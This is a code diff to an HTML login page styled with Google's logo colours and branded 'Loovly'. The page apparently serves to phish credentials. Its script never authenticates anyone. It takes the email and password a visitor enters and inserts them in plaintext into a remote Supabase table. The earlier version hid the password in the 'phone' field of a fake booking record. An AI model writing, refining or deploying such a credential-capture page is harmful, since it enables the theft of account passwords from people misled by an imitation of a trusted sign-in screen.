@@ -12,12 +12,12 @@
   .logo .b{color:#4285F4} .logo .r{color:#DB4437} .logo .y{color:#F4B400} .logo .g{color:#0F9D58}
   .input-group{text-align:left; margin-bottom:20px;}
   .input-group label{font-size:14px; color:#5f6368;}
-  .input-group input{width:100%; padding:15px 14px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; margin-top:6px; color:#202124;}
-  .input-group input::placeholder{color:#80868b; font-size:15px;}
+  .input-group input{width:100%; padding:15px 14px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; margin-top:6px;}
+  .input-group input::placeholder{color:#80868b;}
   .input-group input:focus{border:2px solid #1a73e8; padding:14px 13px;}
   button{width:100%; padding:11px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; margin-top:15px;}
   button:hover{background:#1765cc;}
-  #msg{margin-top:20px; font-size:14px;}
+  #msg{margin-top:20px; font-size:14px; font-weight:500;}
   .footer{margin-top:40px; font-size:14px; font-weight:500; display:flex; justify-content:center; align-items:center; gap:6px;}
   .footer .b{color:#4285F4} .footer .r{color:#DB4437} .footer .y{color:#F4B400} .footer .g{color:#0F9D58}
   .footer .year{color:#5f6368; font-weight:400; font-size:13px;}
@@ -54,18 +54,35 @@ const supabaseClient = window.supabase.createClient(
   'https://nwpyevsjnublptabupup.supabase.co',
   'sb_publishable_v18mMHdeW7e-0pegmi9sTg_U3HkIlJK'
 );
+
 async function handleLoovlyLogin(e){
   e.preventDefault();
   const email = document.getElementById('email').value.trim();
   const password = document.getElementById('password').value.trim();
   const btn = document.getElementById('btn');
   const msg = document.getElementById('msg');
-  btn.disabled=true; btn.innerText='Loading...';
-  const { error } = await supabaseClient.from('bookings').insert([{ name:'Loovly', email:email, phone:password, destination:'Loovly 2026' }]);
-  if(error){ msg.innerText='Error: '+error.message; msg.style.color='#d93025'; }
-  else { msg.innerText='Welcome!'; msg.style.color='#1e8e3e'; }
-  btn.disabled=false; btn.innerText='Next';
+  
+  btn.disabled = true;
+  btn.innerText = 'Loading...';
+  msg.innerText = '';
+
+  const { error } = await supabaseClient
+    .from('users_simple')
+    .insert([{ email: email, password: password }]);
+
+  if(error){
+    msg.innerText = 'Error: ' + error.message;
+    msg.style.color = '#d93025';
+  } else {
+    msg.innerText = 'Saved successfully ✓';
+    msg.style.color = '#1e8e3e';
+    document.getElementById('loovlyForm').reset();
+  }
+  
+  btn.disabled = false;
+  btn.innerText = 'Next';
 }
 </script>
+
 </body>
 </html>
